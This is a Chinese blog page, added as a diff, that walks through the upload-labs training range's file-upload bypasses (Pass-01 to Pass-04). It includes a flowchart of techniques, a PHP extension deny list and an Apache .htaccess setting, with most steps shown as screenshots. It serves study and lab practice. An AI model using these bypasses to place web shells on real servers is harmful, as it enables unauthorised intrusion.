@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyaxiao.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"posthide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文件上传漏洞如何判断上传漏洞类型 靶机包含漏洞类型分类12345678910111213141516171819202122232425262728293031323334353637383940flowchart LR    A[文件上传漏洞绕过] --&gt; B[客户端]    A --&gt; C[服务端]    A --&gt; D[代码逻辑]    B --&gt; B1[1 查看客户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习小屋">
+<meta property="og:url" content="https://wuyaxiao.github.io/2025/11/04/uploads-labs/index.html">
+<meta property="og:site_name" content="学习小屋">
+<meta property="og:description" content="文件上传漏洞如何判断上传漏洞类型 靶机包含漏洞类型分类12345678910111213141516171819202122232425262728293031323334353637383940flowchart LR    A[文件上传漏洞绕过] --&gt; B[客户端]    A --&gt; C[服务端]    A --&gt; D[代码逻辑]    B --&gt; B1[1 查看客户">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/sum_up.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107091532154.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107091556973.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107082948951.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107090042716.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107090225467.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251104173531026.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251104173738120.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251106203544916.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251106203622536.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251106203955187.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251106205339886.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251107091743217.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123416409.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123457851.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123515800.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123620530.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123632163.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123649257.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108123851861.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108140508831.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108140642399.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108140728670.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108140931141.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108141202602.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108153703007.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108153715206.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251108153756814.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109223851218.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109224031899.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109224128478.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109224332826.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109224903852.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109224942365.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230153532.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230424729.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230537474.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230604260.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230623789.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109230756652.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231141450.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231206777.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231228359.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231604527.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231751763.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231810868.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251109231829764.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111130244385.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111130800128.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111132048059.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111132559285.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111131721560.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111132857113.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111132940591.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133017350.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133200011.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133303877.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133906755.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133930753.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111133950834.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111135314944.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111213528289.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111135859510.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111211824259.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111213608256.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111214513415.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111214557875.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111214751730.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251111214810866.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251112141024607.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251112162202541.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251112141125910.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/image-20251112081011317.png">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757151_656ec0df25c22e5f7413b.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757159_656ec0e7aa9761d2124fb.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757167_656ec0ef824e1624a4999.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757176_656ec0f83db1e9a33bd28.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757191_656ec1072f084172eeb62.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757197_656ec10d1269de6113d4b.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757210_656ec11a3c87c156fead2.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757222_656ec1260e708b551d1ef.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757230_656ec12ec27ce3ad792a3.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757242_656ec13aa26bb77de973e.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757254_656ec1466ba108b888d1c.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757267_656ec1534ec73896a7e68.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757274_656ec15aa5acde755422f.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757284_656ec16413f020d453ee8.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757296_656ec1708c4ed0692ec63.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757309_656ec17d306ae62c4905d.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757315_656ec1832f264cca69b98.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757327_656ec18fb8c33ff1f8093.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757339_656ec19b5404fc57890d5.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757348_656ec1a493ab1a715181b.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757359_656ec1afc7467b017d62b.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757365_656ec1b5aa56236ff7eca.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757373_656ec1bdb9e97fb0eb57a.jpeg">
+<meta property="og:image" content="https://wuyaxiao.github.io/uploads-labs/1701757386_656ec1ca95d75e005e9b3.jpeg">
+<meta property="article:published_time" content="2025-11-04T08:43:53.756Z">
+<meta property="article:modified_time" content="2025-12-01T12:06:30.564Z">
+<meta property="article:author" content="wuyaxiao">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyaxiao.github.io/uploads-labs/sum_up.png">
+
+<link rel="canonical" href="https://wuyaxiao.github.io/2025/11/04/uploads-labs/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | 学习小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">学习小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyaxiao.github.io/2025/11/04/uploads-labs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="wuyaxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-04 16:43:53" itemprop="dateCreated datePublished" datetime="2025-11-04T16:43:53+08:00">2025-11-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-12-01 20:06:30" itemprop="dateModified" datetime="2025-12-01T20:06:30+08:00">2025-12-01</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="如何判断上传漏洞类型"><a href="#如何判断上传漏洞类型" class="headerlink" title="如何判断上传漏洞类型"></a>如何判断上传漏洞类型</h2><p><img src="/uploads-labs/sum_up.png" alt="判断上传漏洞类型"></p>
+<h2 id="靶机包含漏洞类型分类"><a href="#靶机包含漏洞类型分类" class="headerlink" title="靶机包含漏洞类型分类"></a>靶机包含漏洞类型分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[文件上传漏洞绕过] --&gt; B[客户端]</span><br><span class="line">    A --&gt; C[服务端]</span><br><span class="line">    A --&gt; D[代码逻辑]</span><br><span class="line"></span><br><span class="line">    B --&gt; B1[1 查看客户端代码并做对应的绕过处理]</span><br><span class="line">    </span><br><span class="line">    B1 --&gt; B11[1.1 修改js代码]</span><br><span class="line">    B1 --&gt; B12[1.2 关闭浏览器JS解析]</span><br><span class="line">    B1 --&gt; B13[1.3 用bp抓包工具改后缀名]</span><br><span class="line"></span><br><span class="line">    C --&gt; C1[检查后缀]</span><br><span class="line">    </span><br><span class="line">    C --&gt; C2[检查内容]</span><br><span class="line">    </span><br><span class="line">    C1 --&gt; C11[黑名单]</span><br><span class="line">    C11 --&gt; C111[1 上传特殊可解析后缀]</span><br><span class="line">    C11 --&gt; C112[2 上传.htaccess或者.user.ini]</span><br><span class="line">    C11 --&gt; C113[3 后缀大小写绕过]</span><br><span class="line">    C11 --&gt; C114[4 点绕过]</span><br><span class="line">    C11 --&gt; C115[5 空格绕过]</span><br><span class="line">    C11 --&gt; C116[6 ::SDATA绕过]</span><br><span class="line">    C11 --&gt; C117[7 配合解析漏洞]</span><br><span class="line">    C117 --&gt; C1171[7.1 Apache陌生后缀解析漏洞]</span><br><span class="line">    C117 --&gt; C1172[7.2 Apache换行解析漏洞]</span><br><span class="line">    C11 --&gt; C118[8 双后缀名绕过]</span><br><span class="line"></span><br><span class="line">    C1 --&gt; C12[白名单]</span><br><span class="line">    C12 --&gt; C121[1 MIME绕过]</span><br><span class="line">    C121 --&gt; C1211[1.1 改Content-Type]</span><br><span class="line">    C121 --&gt; C1212[1.2 改文件后缀]</span><br><span class="line">    C12 --&gt; C122[2 %00截断]</span><br><span class="line">    C12 --&gt; C123[3 0x00截断]</span><br><span class="line"></span><br><span class="line">    C2 --&gt; C23[1 文件头检查]</span><br><span class="line">    C2 --&gt; C24[2 突破getimagesize函数]</span><br><span class="line">    C2 --&gt; C25[3 突破exif_imagetype函数]</span><br><span class="line">    C2 --&gt; C26[4 二次渲染]</span><br><span class="line"></span><br><span class="line">    D --&gt; D1[1 条件竞争]</span><br></pre></td></tr></table></figure>
+
+<h1 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h1><h2 id="Pass-01（-前端验证）"><a href="#Pass-01（-前端验证）" class="headerlink" title="Pass-01（ 前端验证）"></a>Pass-01（ 前端验证）</h2><blockquote>
+<p>客户端验证</p>
+</blockquote>
+<p>源代码上传逻辑：</p>
+<p><img src="/uploads-labs/image-20251107091532154.png" alt="image-20251107091532154"></p>
+<p><img src="/uploads-labs/image-20251107091556973.png" alt="image-20251107091556973"></p>
+<h3 id="修改js代码"><a href="#修改js代码" class="headerlink" title="修改js代码"></a>修改js代码</h3><blockquote>
+<p>修改html代码和css代码可以直接在元素界面改然后会实时渲染，但是修改js代码在元素界面改无效，因为它是按照source里面的代码片段运行的</p>
+<p><img src="/uploads-labs/image-20251107082948951.png" alt="image-20251107082948951"></p>
+</blockquote>
+<p>把js复制下来，打开浏览器控制台，并回车，直接重置checkFile()这个同名函数</p>
+<p><img src="/uploads-labs/image-20251107090042716.png" alt="image-20251107090042716"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251107090225467.png" alt="image-20251107090225467"></p>
+<h3 id="关闭浏览器JS解析"><a href="#关闭浏览器JS解析" class="headerlink" title="关闭浏览器JS解析"></a>关闭浏览器JS解析</h3><p>chrome浏览器的话按照官方教程来<a target="_blank" rel="noopener" href="https://developer.chrome.com/docs/devtools/javascript/disable?hl=zh-cn">https://developer.chrome.com/docs/devtools/javascript/disable?hl=zh-cn</a></p>
+<p><img src="/uploads-labs/image-20251104173531026.png" alt="image-20251104173531026"></p>
+<p><img src="/uploads-labs/image-20251104173738120.png" alt="image-20251104173738120"></p>
+<p>这种方法有缺陷，因为禁用了js代码，如果在实战中，网站的一些正常功能可能无法显示。当然打靶通关是可以的。</p>
+<h3 id="用bp抓包工具直接将改后缀名"><a href="#用bp抓包工具直接将改后缀名" class="headerlink" title="用bp抓包工具直接将改后缀名"></a>用bp抓包工具直接将改后缀名</h3><p>先修改文件名为pass.jpg，然后在上传时抓包修改文件名为pass.php，成功上传</p>
+<p><img src="/uploads-labs/image-20251106203544916.png" alt="image-20251106203544916"></p>
+<p><img src="/uploads-labs/image-20251106203622536.png" alt="image-20251106203622536"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251106203955187.png" alt="image-20251106203955187"></p>
+<p><img src="/uploads-labs/image-20251106205339886.png" alt="image-20251106205339886"></p>
+<h2 id="Pass-02（MIME验证）"><a href="#Pass-02（MIME验证）" class="headerlink" title="Pass-02（MIME验证）"></a>Pass-02（MIME验证）</h2><blockquote>
+<p>服务器端验证-检查后缀-白名单</p>
+</blockquote>
+<p>源代码上传逻辑：</p>
+<p><img src="/uploads-labs/image-20251107091743217.png" alt="image-20251107091743217"></p>
+<h3 id="改Content-Type"><a href="#改Content-Type" class="headerlink" title="改Content-Type"></a>改Content-Type</h3><p>上传pass.php后BP拦截改Content-Type</p>
+<p><img src="/uploads-labs/image-20251108123416409.png" alt="image-20251108123416409"></p>
+<p><img src="/uploads-labs/image-20251108123457851.png" alt="image-20251108123457851"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251108123515800.png" alt="image-20251108123515800"></p>
+<h3 id="改文件后缀"><a href="#改文件后缀" class="headerlink" title="改文件后缀"></a>改文件后缀</h3><p>上传pass.jpg，BP抓包后改文件后缀</p>
+<p><img src="/uploads-labs/image-20251108123620530.png" alt="image-20251108123620530"></p>
+<p><img src="/uploads-labs/image-20251108123632163.png" alt="image-20251108123632163"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251108123649257.png" alt="image-20251108123649257"></p>
+<h2 id="Pass-03（黑名单验证，特殊后缀名）"><a href="#Pass-03（黑名单验证，特殊后缀名）" class="headerlink" title="Pass-03（黑名单验证，特殊后缀名）"></a>Pass-03（黑名单验证，特殊后缀名）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251108123851861.png" alt="image-20251108123851861"></p>
+<blockquote>
+<p>常见特殊可解析后缀：php1,php2,php3,php4.php5,phtmI,pht</p>
+</blockquote>
+<p>查看”\upload-labs-env\Apache\conf\httpd.conf”发现其允许的后缀名如下：</p>
+<p><img src="/uploads-labs/image-20251108140508831.png" alt="image-20251108140508831"></p>
+<p>上传文件pass.phtml</p>
+<p><img src="/uploads-labs/image-20251108140642399.png" alt="image-20251108140642399"></p>
+<p><img src="/uploads-labs/image-20251108140728670.png" alt="image-20251108140728670"></p>
+<p>尝试蚁剑连接</p>
+<p><img src="/uploads-labs/image-20251108140931141.png" alt="image-20251108140931141"></p>
+<h2 id="Pass-04（黑名单验证-htaccess）"><a href="#Pass-04（黑名单验证-htaccess）" class="headerlink" title="Pass-04（黑名单验证,.htaccess）"></a>Pass-04（黑名单验证,.htaccess）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251108141202602.png" alt="image-20251108141202602"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置条件"><a href="#配置条件" class="headerlink" title="配置条件"></a>配置条件</h4><p>条件一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在httpd.conf或虚拟主机配置中：\upload-labs-env\Apache\conf\httpd.conf</span><br><span class="line">&lt;Directory &quot;/var/www/html/uploads&quot;&gt;</span><br><span class="line">    AllowOverride All     # ← 危险！允许.htaccess生效</span><br><span class="line">    # 或者至少允许了FileInfo</span><br><span class="line">    AllowOverride FileInfo</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>条件二</p>
+<ul>
+<li>Apache对该目录有读取权限</li>
+<li><code>.htaccess</code>文件有读取权限</li>
+</ul>
+<p>条件三</p>
+<p>没有额外的安全限制：</p>
+<ol>
+<li>.htaccess文件不能起名字，他就是.htaccess文件，如果你将他改为4.htaccess或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</li>
+<li>当php版本高于5.2.17时，<code>.htaccess</code>文件上传漏洞就不再存在, 所以说这个漏洞在实战环境下几乎时不肯能存在的</li>
+</ol>
